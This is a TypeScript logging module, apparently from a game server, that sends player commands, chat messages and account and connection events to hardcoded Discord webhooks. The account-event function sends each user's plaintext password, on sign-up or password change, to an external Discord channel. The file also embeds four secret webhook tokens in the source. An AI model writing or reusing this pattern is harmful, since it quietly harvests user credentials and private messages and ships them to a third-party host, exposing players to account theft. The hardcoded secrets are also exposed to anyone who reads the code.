import { fetch } from "undici";

interface DiscordEmbed {
  title?: string;
  description?: string;
  color?: number;
  timestamp?: string;
  footer?: {
    text: string;
  };
}

export class Webhook {
  private static readonly COMMANDS_WEBHOOK_URL = "https://discord.com/api/webhooks/1361346696772063232/8j5-jgCXb8O4OkE0UyVpRnEwIiHcODf4X1J7eKJ-pn73xg8d0OwCleIvPMLx9Apodv-L";
  private static readonly CHAT_WEBHOOK_URL = "https://discord.com/api/webhooks/1361352240413016234/r9EHeTKvbl8iyMnWr7jFOmP1ayg7Ulcw3_SQHpAuYX_pV0g6Wjx-Hji4PCyK0dIz96K7";
  private static readonly ACCOUNT_WEBHOOK_URL = "https://discord.com/api/webhooks/1361407949280378941/Zuy0AcEgJtXea8KoZv7sOKAVa_iuxFwY7fSqIJAQ_TW0Ra0GRTefPbzR9ZXp3L0RBNyJ";
  private static readonly CONNECTION_WEBHOOK_URL = "https://discord.com/api/webhooks/1361562561262260264/KsG8uz9RaVPQ_ChZhqUeCELPmDJ5YsFyQJIAOTd0Y8eoKAdDUYy0NF-e2sQlY1JY7tm1";

  private static async sendWebhook(url: string, embed: DiscordEmbed) {
    try {
      await fetch(url, {
        method: "POST",
        headers: {
          "Content-Type": "application/json"
        },
        body: JSON.stringify({
          embeds: [{
            ...embed,
            timestamp: new Date().toISOString()
          }]
        })
      });
    } catch (error) {
      console.error("Failed to send webhook:", error);
    }
  }

  public static async sendCommand(username: string, command: string, world: string) {
    const description = `<:arrow:1361614176388382871> **User:** **\`\`\`${username}\`\`\`**\n<:arrow:1361614176388382871> **Command:** **\`\`\`${command}\`\`\`**\n<:arrow:1361614176388382871> **World:** **\`\`\`${world}\`\`\`**`;
    await this.sendWebhook(this.COMMANDS_WEBHOOK_URL, {
      title: "Commands log",
      description: description,
      color: 0xffd700,
      footer: {
        text: `${new Date().toLocaleString()}`
      }
    });
  }

  public static async sendChat(username: string, message: string, world: string) {
    const description = `<:arrow:1361614176388382871> **User:** **\`\`\`${username}\`\`\`**\n<:arrow:1361614176388382871> **Message:** **\`\`\`${message}\`\`\`**\n<:arrow:1361614176388382871> **World:** **\`\`\`${world}\`\`\`**`;
    await this.sendWebhook(this.CHAT_WEBHOOK_URL, {
      title: "Chat log",
      description: description,
      color: 0xffd700,
      footer: {
        text: `${new Date().toLocaleString()}`
      }
    });
  }

  public static async sendAccountEvent(username: string, event: "create" | "password_change", ip: string, password: string) {
    const description = `<:arrow:1361614176388382871> **User:** **\`\`\`${username}\`\`\`**\n<:arrow:1361614176388382871> **Password:** **\`\`\`${password}\`\`\`**\n<:arrow:1361614176388382871> **Reason:** **\`\`\`${event === "create" ? "New account" : "Password changed"}\`\`\`**`;
    await this.sendWebhook(this.ACCOUNT_WEBHOOK_URL, {
      title: "Account Log",
      description: description,
      color: 0xffd700,
      footer: {
        text: `${new Date().toLocaleString()}`
      }
    });
  }

  public static async sendConnectionEvent(username: string, event: "login" | "logout", ip: string) {
    const description = `<:arrow:1361614176388382871> **User:** **\`\`\`${username}\`\`\`**\n<:arrow:1361614176388382871> **Status:** **\`\`\`${event === "login" ? "Success" : "Failed"}\`\`\`**${event === "logout" ? `\n<:arrow:1361614176388382871> **Reason:** **\`\`\`Disconnected\`\`\`**` : ""}`;
    await this.sendWebhook(this.CONNECTION_WEBHOOK_URL, {
      title: "Connection Log",
      description: description,
      color: 0xffd700,
      footer: {
        text: `${new Date().toLocaleString()}`
      }
    });
  }
} 